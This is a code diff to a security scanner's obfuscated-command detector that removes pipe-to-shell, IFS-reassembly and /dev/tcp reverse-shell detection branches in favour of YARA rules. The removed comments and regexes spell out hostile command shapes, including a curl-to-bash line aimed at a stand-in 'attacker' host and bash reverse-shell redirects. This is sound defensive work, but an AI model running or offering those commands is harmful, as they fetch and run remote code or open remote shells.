@@ -409,65 +409,11 @@ Object.assign(EncodedContentDetector.prototype, {
       });
     }
 
-    // ── B4: pipe-to-shell ──
-    //
-    //   curl … | (ba)?sh
-    //   wget … | (ba)?sh
-    //   curl …; echo "…" | base64 -d | (ba)?sh
-    //   base64 -d <<< "…" | sh
-    //   xxd -r -p <<< "…" | sh
-    //   eval $(curl -s https://…)
-    //   bash <(curl -s https://…)
-    //   source <(wget -O- https://…)
-    //
-    // Two tiers: when the upstream is a static literal (heredoc / `<<<`
-    // / quoted echo) we attempt to decode it; otherwise the candidate
-    // is a detection-only pattern emission (severity bumped to
-    // critical inside _processCommandObfuscation via _executeOutput).
-    //
-    // For the live-fetch variant the upstream URL *is* the payload —
-    // no transformation to recover. The `deobfuscated` field is set to
-    // the raw matched command (e.g. `curl -s http://attacker/x | bash`)
-    // rather than a synthesised `pipe-to-shell upstream: <URL>` label.
-    // Reasons:
-    //   • the raw command line IS the actionable artefact; synthesising
-    //     a breadcrumb string hides the real pattern from the sidebar
-    //     preview + the "Load for analysis" drill-down;
-    //   • `_patternIocs` already carries the upstream URL as an IOC.URL
-    //     with T1105 pattern metadata, so IOC emission doesn't depend
-    //     on parsing the synthesised string;
-    //   • loading a synthetic `"pipe-to-shell upstream: …"` text file
-    //     for re-analysis produces no useful findings (there's nothing
-    //     encoded in the breadcrumb), whereas loading the raw curl-pipe-
-    //     bash line re-runs the full scanner on the real command.
-    const pipeShellRe = /\b(?:curl|wget|fetch|invoke-webrequest|iwr|irm)\b[^\r\n|]{0,400}\|\s*(?:base64\s+-(?:d|decode)\s*\|\s*)?(?:xxd\s+-r(?:\s+-p)?\s*\|\s*)?(?:rev\s*\|\s*)?(?:ba)?sh\b/gi;
-    while ((m = pipeShellRe.exec(text)) !== null) {
-      throwIfAborted();
-      if (candidates.length >= this.maxCandidatesPerType) break;
-      const raw = m[0];
-      if (raw.length > 600) continue;
-      // Extract the upstream URL (first https?:// in the match) — this
-      // is the actionable artefact; attached as an IOC.URL via
-      // `_patternIocs` below.
-      const urlMatch = /https?:\/\/[^\s|'"`<>]{3,400}/.exec(raw);
-      const upstreamUrl = urlMatch ? urlMatch[0] : null;
-      candidates.push({
-        type: 'cmd-obfuscation',
-        technique: 'Bash Pipe-to-Shell (live fetch)',
-        raw,
-        offset: m.index,
-        length: raw.length,
-        deobfuscated: raw,
-        _executeOutput: true,
-        _patternIocs: upstreamUrl ? [{
-          url: `Bash live-fetch pipe-to-shell \u2014 fetches ${upstreamUrl} and pipes response to shell (T1105)`,
-          severity: 'critical',
-        }] : [{
-          url: 'Bash live-fetch pipe-to-shell (T1105)',
-          severity: 'high',
-        }],
-      });
-    }
+    // NOTE: "Bash Pipe-to-Shell (live fetch)" branch was removed in the
+    // Deobfuscation cull — the decoder re-emitted the raw command verbatim
+    // and added no cleartext. The YARA rule `Bash_Live_Fetch_Pipe_Shell`
+    // in src/rules/script-threats.yar is now the sole signal source.
+    // IOC.URL for the upstream fetch is emitted via the URL finder.
 
     // base64-pipe-to-shell where the payload is right there
     //   echo "BASE64STR" | base64 -d | (ba)?sh        (quoted)
@@ -633,17 +579,11 @@ Object.assign(EncodedContentDetector.prototype, {
       const raw = m[0];
       if (raw.length > 1500) continue;
       if (value === undefined) {
-        // Structural-only emission (high confidence on its own — IFS
-        // reassignment paired with eval is overwhelmingly malicious).
-        candidates.push({
-          type: 'cmd-obfuscation',
-          technique: 'Bash IFS Reassembly (structural)',
-          raw,
-          offset: m.index,
-          length: raw.length,
-          deobfuscated: `IFS-reassembly invoking $${varName}`,
-          _executeOutput: true,
-        });
+        // Decoder cull: the structural-only "Bash IFS Reassembly
+        // (structural)" emission was removed — it produced a synthetic
+        // `"IFS-reassembly invoking $VAR"` label, not a decoded payload.
+        // The YARA rule `Bash_IFS_Reassembly` now covers the shape for
+        // the file-scan path.
         continue;
       }
       // Replace the IFS chars in `value` with spaces — POSIX shell
@@ -741,47 +681,12 @@ Object.assign(EncodedContentDetector.prototype, {
       });
     }
 
-    // ── /dev/tcp reverse shell — the canonical bash reverse-shell
-    //    primitive. Structural pattern detection; the regex groups
-    //    capture host:port which we extract into `deobfuscated` so the
-    //    sidebar shows the pivot target rather than the raw redirect
-    //    string. Three shapes we recognise:
-    //      (1) bash -i … >& /dev/tcp/host/port        (classic)
-    //      (2) /dev/tcp/host/port … 0<& | >& N        (fd redirect pair)
-    //      (3) exec N<>/dev/tcp/host/port             (bi-directional
-    //          bash bind — the compact form used by tiny stagers
-    //          where the shell payload follows via `cat <&N`.)
-    //    Sibling YARA rule `Bash_DevTcp_Reverse_Shell` provides parity
-    //    detection for decoded-payload / file-scan paths.
-    const devTcpRe = /\b(?:bash|sh)\s+-i\b[^\r\n]{0,200}>\s*&?\s*\/dev\/tcp\/[\w.\-]+\/\d{1,5}|\b\/dev\/tcp\/[\w.\-]+\/\d{1,5}\b[^\r\n]{0,200}\b(?:0<&|>&)\d|\bexec\s+\d{1,3}\s*<>\s*\/dev\/tcp\/[\w.\-]+\/\d{1,5}/gi;
-    while ((m = devTcpRe.exec(text)) !== null) {
-      throwIfAborted();
-      if (candidates.length >= this.maxCandidatesPerType) break;
-      const raw = m[0];
-      if (raw.length > 500) continue;
-      // Extract host:port from the /dev/tcp/host/port atom.
-      const hpMatch = /\/dev\/tcp\/([\w.\-]+)\/(\d{1,5})/.exec(raw);
-      const host = hpMatch ? hpMatch[1] : null;
-      const port = hpMatch ? hpMatch[2] : null;
-      const resolved = host && port
-        ? `bash /dev/tcp reverse-shell \u2192 ${host}:${port}`
-        : `bash /dev/tcp reverse-shell`;
-      candidates.push({
-        type: 'cmd-obfuscation',
-        technique: 'Bash /dev/tcp Reverse Shell',
-        raw,
-        offset: m.index,
-        length: raw.length,
-        deobfuscated: resolved,
-        _executeOutput: true,
-        _patternIocs: [{
-          url: host && port
-            ? `Bash /dev/tcp reverse-shell \u2014 TCP connect-back to ${host}:${port} (T1059.004)`
-            : 'Bash /dev/tcp reverse-shell (T1059.004)',
-          severity: 'critical',
-        }],
-      });
-    }
+    // NOTE: "Bash /dev/tcp Reverse Shell" branch was removed in the
+    // Deobfuscation cull — the decoder emitted `bash /dev/tcp reverse-
+    // shell \u2192 host:port` which restated the raw command. The YARA
+    // rule `Bash_DevTcp_Reverse_Shell` in src/rules/script-threats.yar
+    // is now the sole signal source; host:port flow through the
+    // existing IOC.IP / IOC.URL extractors.
 
     // ── B7: `echo -e` hex/octal executor ────────────────────────
     //
